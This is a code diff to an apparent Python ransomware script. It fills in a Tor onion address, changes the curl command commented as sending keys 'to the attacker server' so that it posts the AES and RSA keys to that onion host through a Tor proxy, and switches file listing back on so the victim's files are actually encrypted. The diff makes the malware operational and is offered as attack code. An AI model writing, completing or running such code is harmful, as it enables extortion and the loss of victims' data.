@@ -15,9 +15,8 @@ from Crypto.PublicKey import RSA
 import os, sys, struct
 import argparse
 from Database.keygenerator import class_keys
-import Database.sqlite as bbdd
 
-URL_TOR = ""
+URL_TOR = "62uxh4sdczcyr6tkndwy5mvr3xjhmobruq5vxymtzusddcew6deem2ad.onion"
 PWD_RANS = os.path.dirname(os.path.abspath(__file__))
 
 if sys.version_info >= (3, 8, 0):
@@ -80,7 +79,7 @@ def initialize_keys():
     data = (keys.AESkey, keys.PUBLIC_RSAKEY, keys.PRIVATE_RSAKEY, '0')
     
     #Send keys to the attacker server
-    command =  '''curl localhost:8008/   -H "Content-Type: application/json"   -X POST --data '{"keyAES":"'''+keys.AESkey.hex()+'''", "keyPubRSA":"'''+keys.PUBLIC_RSAKEY.hex()+'''", "keyPrivRSA":"'''+keys.PRIVATE_RSAKEY.hex()+'''"}' '''
+    command =  '''curl --socks5-hostname localhost:9050 '''+URL_TOR+''' -H "Content-Type: application/json"   -X POST --data '{"keyAES":"'''+keys.AESkey.hex()+'''", "keyPubRSA":"'''+keys.PUBLIC_RSAKEY.hex()+'''", "keyPrivRSA":"'''+keys.PRIVATE_RSAKEY.hex()+'''"}' '''
     os.system(command)
 
     #Store AES key encrypted in system
@@ -237,8 +236,7 @@ def decrypt_file(l_files, key):
         
 def main(): 
     args = parse_args()
-    #l_files = list_files(args)
-    l_files = []
+    l_files = list_files(args)
 
     if args.encrypt == True:
         #Encrypt files of your system
